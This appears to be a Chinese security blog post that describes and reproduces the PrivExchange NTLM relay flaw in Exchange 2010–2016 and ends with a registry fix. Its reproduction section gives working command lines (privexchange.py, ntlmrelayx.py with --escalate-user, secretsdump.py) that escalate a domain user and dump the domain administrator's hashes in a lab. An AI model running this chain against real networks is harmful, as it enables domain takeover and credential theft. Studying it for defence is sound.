**目录**

[漏洞描述](#t0 "漏洞描述")

[漏洞影响版本](#t1 "漏洞影响版本")

[漏洞过程](#t2 "漏洞过程")

[漏洞复现](#t3 "漏洞复现")

[漏洞修复](#t4 "漏洞修复")

* * *

漏洞描述
----

       Exchange Server于2018年11月份被爆出存在SSRF漏洞，可以伪造任意用户。但在之后又被爆出另外一种攻击方式，可以使用任意域内用户通过NTML Relay来接管域控！攻击者仅需要拥有一个普通域内[用户权限](https://so.csdn.net/so/search?q=%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020)即可对存在漏洞的Exchange服务器发起攻击，进而接管域控。

漏洞影响版本
------

*   Exchange 2010 ~ Exchange 2016 

漏洞过程
----

        Exchange允许任何用户为推送订阅指定所需的URL，服务器将尝试向这个URL发送通知。问题出在Exchange服务器使用 [CredentialCache.DefaultCredentials](https://docs.microsoft.com/en-us/dotnet/api/system.net.credentialcache.defaultcredentials "CredentialCache.DefaultCredentials") 进行连接。由于传进的URL我们可控，也就是说我们可以控制Exchange向我们指定的服务器发起HTTP协议的NTLM 请求，我们就能拿到Exchange机器用户的 Net-Ntlm Hash，然后进行NTLM Relay到LDAP，由于Exchange服务器在域内权限较高，可以修改用户的ACL，于是我们可以修改指定用户的dcsync权限来dump域内哈希接管域控。

**漏洞复现**
--------

**方法一：**

```
python2 Exchange2domain.py -ah 10.211.55.2 -ap 80 -u test -p "P@ss1234" -d xie.com -th 10.211.55.4 10.211.55.5
```


![](https://img-blog.csdnimg.cn/20210630233125573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210630233153205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**方法二：**

```
python2 privexchange.py -ah 10.211.55.2 -u test -p "P@ss1234" -d xie.com 10.211.55.5 --debug
```


![](https://img-blog.csdnimg.cn/20210701091838132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
python3 ntlmrelayx.py -t ldap://10.211.55.4 --escalate-user test
```


![](https://img-blog.csdnimg.cn/20210701093741742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210701093809291.png)

```
python3 secretsdump.py xie.com/test:P@ss1234@10.211.55.4 -dc-ip 10.211.55.4 -just-dc-user administrator
```


![](https://img-blog.csdnimg.cn/20210701220224241.png)

![](https://img-blog.csdnimg.cn/img_convert/2c996eafef376f664a63f470ead1784a.png)

漏洞修复
----

删除注册表中的一个键值 DisableLoopbackCheck：

```
reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v DisableLoopbackCheck /f
```


  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)